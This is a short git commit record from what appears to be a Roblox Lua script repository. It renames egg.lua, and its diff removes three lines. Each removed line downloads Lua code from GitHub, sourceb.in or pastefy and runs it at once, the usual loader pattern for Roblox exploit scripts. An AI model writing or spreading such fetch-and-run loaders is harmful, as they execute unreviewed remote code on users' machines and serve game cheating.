f798bd3669a6c653d31f2cc55b4cb384fb5f02b3
KuniDevLua <profkunin@gmail.com>
2025-07-17 13:32:27 +0800

    Update and rename egg.lua to LuaByKuni

--- egg.lua
+++
@@ -1,3 +0,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/X/refs/heads/main/UpdatedLuaKuni"))()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pcne3gIxvJ/0", true))()
-loadstring(game:HttpGet("https://pastefy.app/vZ3U5ouR/raw"))()
